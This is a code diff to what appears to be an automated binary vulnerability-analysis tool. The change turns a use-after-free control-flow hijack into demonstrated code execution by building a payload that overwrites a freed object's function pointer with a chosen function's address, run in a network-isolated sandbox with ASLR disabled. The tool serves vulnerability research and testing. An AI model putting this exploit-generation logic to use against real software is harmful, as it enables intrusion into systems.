@@ -677,6 +677,65 @@ def _reclaim_sequence(model: dict, opts: list, width, marker: bytes, size: int =
     return b"".join(w)
 
 
+def _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper, model, opts, width,
+                      alloc, plt_mode, pie, edges, observation, load_base):
+    """Drive the demonstrated hijack to CODE EXECUTION: put a chosen function's address in the
+    reclaim payload instead of the sentinel, and watch for arrival at it.
+
+    Everything up to here shows the attacker choosing the bytes a dead object's function pointer
+    is read from, and the program calling through them. It stops at a fault because the sentinel
+    is deliberately unmappable. The remaining question is the one an operator actually asks --
+    *so what?* -- and it is answered by substituting a REAL address in bytes already shown to be
+    attacker-controlled, and breakpointing it: the program either arrives there or it does not.
+
+    The target comes from `exploit.find_win`, which is deliberately strict and documents why:
+    redirecting into a function the program calls anyway is a much weaker claim than the badge
+    implies. No win function, no claim -- the hijack stands on its own.
+
+    Returns the arrival event or None. Honest limits, carried into the text by the caller: the
+    address is absolute, and it is only knowable here because this tracer disables ASLR; against
+    a live PIE target the same step needs a leak, which is a different capability.
+    """
+    import json as _json
+    import struct as _struct
+
+    from ..poc import exploit as _exploit
+    funcs = _exploit.elf_functions(target_bytes) or {}
+    name, vaddr = _exploit.find_win(funcs, call_edges=edges)
+    if not (name and vaddr):
+        return None
+    runtime = (int(load_base or 0) + int(vaddr)) if pie else int(vaddr)
+    # The payload sits where the pointer the program CALLED was read from, which the hijack
+    # evidence already names -- not at offset 0 by assumption.
+    at = int(observation.get("offset") or 0)
+    payload = b"A" * at + _struct.pack("<Q", runtime)
+    seq = _reclaim_sequence(model, opts, width, payload)
+    if not seq:
+        return None
+    ctx.progress(msg=f"hijack demonstrated: aiming it at {name} ({hex(runtime)}) to see whether "
+                     f"the program executes it")
+    spec, report = workdir / "spec_exec.json", workdir / "report_exec.json"
+    report.unlink(missing_ok=True)
+    spec.write_text(_json.dumps({
+        "exe": str(exe), "stdin": seq.hex(), "free_off": alloc["free"],
+        "alloc_off": alloc["alloc"], "alloc_ret_offs": [], "pie": pie,
+        "alloc_is_plt": plt_mode, "ignore_ranges": [], "exec_target": int(vaddr),
+        "report": str(report), "timeout": 8}))
+    cmd = (sandbox.isolate_prefix(str(workdir), net=False, rw_binds=[str(workdir)])
+           + ["python3", str(helper), str(spec), str(report)])
+    try:
+        sandbox.run_reaped(cmd, timeout=15, capture_output=True, cwd=str(workdir),
+                           preexec_fn=sandbox._rlimits(2048, 20, set_as=False))
+        rep = _json.loads(report.read_text())
+    except Exception:
+        return None
+    hit = next(iter(rep.get("reclaim_exec") or []), None)
+    if not hit:
+        return None
+    return {"function": name, "addr": hex(runtime), "vaddr": hex(int(vaddr)),
+            "returns_to": hit.get("returns_to"), "aslr": "off (tracer)"}
+
+
 def _file_traced_reclaim(ctx, target, alloc, observation):
     """File a reclaim the TRACER demonstrated, for a target with no output oracle.
 
@@ -716,13 +775,26 @@ def _file_traced_reclaim(ctx, target, alloc, observation):
         "use_pc": hit.get("use_pc"), "effect_kind": hit.get("effect_kind"),
         "effect_pc": hit.get("effect_pc"),
         "chunk_offset": hit.get("chunk_offset"), "allocator": alloc["alloc_name"]})
-    _proof = {"type": "uaf-reclaim-traced", "addr": hit.get("addr"),
+    _proof = {"exec_function": hit.get("exec_function"), "exec_addr": hit.get("exec_addr"),
+              "type": "uaf-reclaim-traced", "addr": hit.get("addr"),
               "offset": hit.get("chunk_offset"), "size": hit.get("size"),
               "marker": hit.get("marker"), "use_pc": hit.get("use_pc"),
               "effect_kind": hit.get("effect_kind"), "effect_pc": hit.get("effect_pc"),
               "effect_fault_addr": hit.get("effect_fault_addr"),
               "effect_via": hit.get("effect_via")}
-    if hit.get("effect_kind") == "control-flow-hijack":
+    if hit.get("executed"):
+        # Code execution, observed at the target. RCE is DEMONSTRATED here and not potential --
+        # the program ran a function the analysis picked -- while the text keeps the two limits
+        # that matter: it is a redirect into existing code, and the address came from a fixed
+        # load base because this tracer disables ASLR.
+        eff = [{"kind": "rce",
+                "title": (f"Code execution through a reclaimed freed object: "
+                          f"{hit.get('exec_function')} (demonstrated)"),
+                "status": "demonstrated", "detail": detail, "proof": _proof},
+               {"kind": "control-flow-hijack",
+                "title": "Control-flow hijack through a reclaimed freed object (demonstrated)",
+                "status": "demonstrated", "detail": detail, "proof": _proof}]
+    elif hit.get("effect_kind") == "control-flow-hijack":
         # The instruction pointer became the attacker's own bytes. That is a hijack, which is a
         # different effect KIND from "the contents are attacker-controlled" -- and RCE rides
         # along as POTENTIAL for the same reason `poc_primitive` does it: the flow is hijacked,
@@ -743,7 +815,9 @@ def _file_traced_reclaim(ctx, target, alloc, observation):
                 "status": "demonstrated", "detail": detail, "proof": _proof}]
     FindingDAO(ctx.conn).upsert(target.id, target.case_id, {
         "cwe": "CWE-416",
-        "title": ("Use-after-free: reclaimed object's bytes CALLED as a function pointer"
+        "title": (f"Use-after-free: reclaimed object redirects execution into "
+                  f"{hit.get('exec_function')}" if hit.get("executed") else
+                  "Use-after-free: reclaimed object's bytes CALLED as a function pointer"
                   if hit.get("effect_kind") == "control-flow-hijack" else
                   "Use-after-free: reclaimed object's bytes DEREFERENCED as a pointer"
                   if hit.get("effect_kind") == "dereference" else
@@ -759,7 +833,8 @@ def _file_traced_reclaim(ctx, target, alloc, observation):
                      f"(no output oracle needed)")
     return {"metrics": {"reclaim": "demonstrated", "reclaim_oracle": "traced-memory",
                         "reclaim_used": bool(hit.get("used")),
-                        "reclaim_effect": hit.get("effect_kind")}}
+                        "reclaim_effect": hit.get("effect_kind"),
+                        "reclaim_exec": hit.get("exec_function") or None}}
 
 
 def _try_uaf_leak(ctx, target, target_bytes, exe, workdir, model, opts, width, alloc):
@@ -963,6 +1038,9 @@ def heap_trace_stage(ctx) -> dict:
         #: chunk that was handed back out, read from the process's own memory. This is what a
         #: target with NO `view` option has instead of the output oracle.
         reclaim_observed = None
+        #: Where the image landed in the tracer (ASLR off, so deterministic). Needed to put a
+        #: REAL code address in a reclaim payload.
+        traced_base = 0
         for i, seq in enumerate(seqs):
             if ctx.should_cancel():
                 break
@@ -990,6 +1068,8 @@ def heap_trace_stage(ctx) -> dict:
             except Exception:
                 continue
             reclaim_traced = reclaim_traced or bool(rep.get("reclaim"))
+            if rep.get("load_base") and not traced_base:
+                traced_base = int(str(rep["load_base"]), 16)
             for _rc in (rep.get("reclaim_controlled") or []):
                 if not _rc.get("marker_before_free"):
                     if reclaim_observed is None:
@@ -1039,6 +1119,19 @@ def heap_trace_stage(ctx) -> dict:
         # chunk instead, and that evidence is filed by the same route so a silent target is not
         # left with "the chunk came back" and nothing more.
         if reclaim_hit is None and reclaim_observed:
+            # A demonstrated hijack earns one more experiment: aim it at a function we choose
+            # and see whether the program executes it. Only then -- the sentinel fault is not
+            # worth spending a run on, and `find_win` refuses to nominate a target it cannot
+            # justify, so most targets stop here.
+            if (reclaim_observed.get("effect") or {}).get("kind") == "control-flow-hijack":
+                try:
+                    _ex = _try_reclaim_exec(ctx, target, target_bytes, exe, workdir, helper,
+                                            model, opts, width, alloc, plt_mode, pie, edges,
+                                            reclaim_observed, traced_base)
+                    if _ex:
+                        reclaim_observed["exec"] = _ex
+                except Exception:
+                    pass
             try:
                 reclaim_hit = _file_traced_reclaim(ctx, target, alloc, reclaim_observed)
             except Exception:
